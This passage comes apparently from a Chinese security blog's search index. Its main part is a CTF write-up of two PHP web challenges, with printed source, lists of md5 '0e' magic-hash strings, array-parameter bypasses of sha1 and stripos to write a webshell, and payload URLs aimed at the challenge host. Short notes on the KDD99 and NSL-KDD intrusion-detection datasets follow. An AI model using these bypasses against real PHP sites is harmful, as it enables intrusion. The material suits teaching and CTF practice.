这里先按x坐标排序后再逐个提取字母速度更快，不过对python的数据结构不甚了解，未能实现。Python的学习有待加强。通过这个题目练习了requests、base64和BeautifulSoup的使用。 Basic PHP这题在bugku里见过，点开题目即可看到代码。 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Exercise&lt;/title&gt; &lt;meta charset=\"UTF-8\"&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;PHP's basic feature&lt;/h1&gt;&lt;!--好吧其实是老套路了--&gt;&lt;?phprequire_once('flag.php');if (isset($_GET['name']) and isset($_GET['password']) &amp;&amp; isset($_GET['test']))&#123; // ========== Stage 1 ========== $test=$_GET['test']; $test=md5($test); if($test=='0') &#123; print 'You passed stage 1.&lt;br /&gt;'; &#125; else&#123; print \"Game over at stage 1.\"; exit(); &#125; // ========== Stage 2 ========== if ($_GET['name'] == $_GET['password'])&#123; print 'Your password can not be your name.'; exit(); &#125; else if (sha1($_GET['name']) === sha1($_GET['password']))&#123; print 'You passed stage 2.&lt;br /&gt;'; print 'Flag: '.$flag; &#125; else&#123; print 'Invalid password'; exit(); &#125;&#125;echo '&lt;hr /&gt;';show_source(__FILE__);?&gt;&lt;/body&gt;&lt;/html&gt; 输入name、password和test三个参数即可进入stage1，接下来是md5()漏洞的一个考察： PHP在处理哈希字符串时，会利用“!=”或“==”来对哈希值进行比较，其中存在一个缺陷，就是它把每个以“0E”开头的哈希值都解析为0后再进行比较。所以，两个不同的密码经过md5()哈希以后，其哈希值都是以“0E”开头的话，那么PHP将会认为他们是相等的，都是0。 根据这个特性，找到一些md5后产生“0E”开头的字符串作为test的值： 123456QNKCDZO240610708s878926199as155964671as214587387as214587387a 随后进入stage2，我们发现题目要求name和password的值不同，而sha1的结果相同。想找到这种碰撞的概率太低了，此处考察了 sha1() 和 md5() 处理数组时会直接返回null，那么可以使 name 和 password为数组类型，sha1 对数组处理后返回 null 绕过 ===(===会判断左右两边的类型和值是否相同) 。 此时可以令name[]=0&amp;password[]=1，即可得到flag。 问题：令name[]=0&amp;password[]=0为什么不行？总之会返回null，值是0还是1会有影响吗 payload:http://vps1.blue-whale.me:23331/feature/?test=s878926199a&password[]=0&name[]=1 Basic PHP 2 题目给出要求getshell，联想到一句话木马，在这个框中随意输入内容，点击start进入新的页面： 在文本框输入一些内容后点击提交，回显success，此时再点击上面的./config.php会发现之前在文本框中的内容已被写入config.php。再结合下面的代码来看： 123456789101112&lt;?phpif(isset($_GET['content']))&#123; $filename = 'config.php'; $content = $_GET['content']; if(is_int(stripos($content, 'php')) || is_int(stripos($content, '&lt;'))) &#123; echo 'Invalid input'; &#125; else &#123; file_put_contents($filename, $content); echo 'Success'; &#125;&#125; stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。strpos() 函数查找字符串在另一字符串中第一次出现的位置（大小写敏感）。 意思已经比较明显了，我们可以通过content这个参数修改config.php中的内容，但是若想写入php一句话木马，就无法通过stripos()的检验(可以看到对php和&lt; 这两个字符串做了检测 )，此时可以利用strpos传入数组时会返回null，经is_int判断后返回false，即可绕过第一个条件判断（看起来stripos也存在这个问题）；这时候就可以通过file_put_content将一句话木马写入config.php了(其实只写一个&lt;即可得到flag)。 payload:http://vps1.blue-whale.me:23360/user/b4466a4c89f48932020df576d9a77e41902f5a0e/index.php?content[]=","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"Web","slug":"Web","permalink":"https://purewhitywhite.github.io/tags/Web/"}]},{"title":"毕业设计笔记","date":"2020-01-20T08:11:02.000Z","path":"2020-01-20/毕业设计笔记/","text":"随着近几年机器学习的迅速发展,许多研究人员使用机器学习算法来解决异常检测领域的难题,并且取得了许多实验成果。请利用该方法尝试实现小型网络的监控。可以利用KDD99数据库。 网络异常流量检测研究数据集选择 KDD99该数据集是从一个模拟的美国空军局域网上采集来的9个星期的网络连接数据,分成具有标识的训练数据和未加标识的测试数据。测试数据和训练数据有着不同的概率分布,测试数据包含了一些未出现在训练数据中的攻击类型,这使得入侵检测更具有现实性。 NSL-KDD该数据集解决了KDD99数据集中存在的固有问题。NSL-KDD数据集由于缺少基于入侵检测网络的公共数据集，所以NSL-KDD数据集仍然存在一些问题，同时也不是现有真实网络的完美代表。但它仍然可以用作有效的基准数据集，以帮助研究人员比较不同的入侵检测方法。NSL-KDD训练集和测试集的设置是合理的，不同研究工作的评估结果将是一致的和可比的。二者具体区别见下： It does not include redundant records in the train set, so the classifiers will not be biased towards more frequent records. NSL-KDD数据集的训练集中不包含冗余记录，所以分类器不会偏向更频繁的记录； There is no duplicate records in the proposed test sets; therefore, the performance of the learners are not biased by the methods which have better detection rates on the frequent records. NSL-KDD数据集的测试集中没有重复的记录，使得检测率更为准确。 The number of selected records from each difficultylevel group is inversely proportional to the percentage of records in the original KDD data set. As a result, the classification rates of distinct machine learning methods vary in a wider range, which makes it more efficient to have an accurate evaluation of different learning techniques. 来自每个难度级别组的所选记录的数量与原始KDD数据集中的记录的百分比成反比。结果，不同机器学习方法的分类率在更宽的范围内变化，这使得对不同学习技术的准确评估更有效。 The number of records in the train and test sets are reasonable, which makes it affordable to run the experiments on the complete set without the need to randomly select a small portion. Consequently, evaluation results of different research works will be consistent and comparable. 训练和测试中的记录数量设置是合理的，这使得在整套实验上运行实验成本低廉而无需随机选择一小部分。因此，不同研究工作的评估结果将是一致的和可比较的。 常用的深度学习算法","tags":[{"name":"IDS","slug":"IDS","permalink":"https://purewhitywhite.github.io/tags/IDS/"}]},{"title":"我的第一篇博客","date":"2019-06-01T13:39:12.000Z","path":"2019-06-01/我的第一篇博客/","text":"Better late than never,huh?","tags":[]}]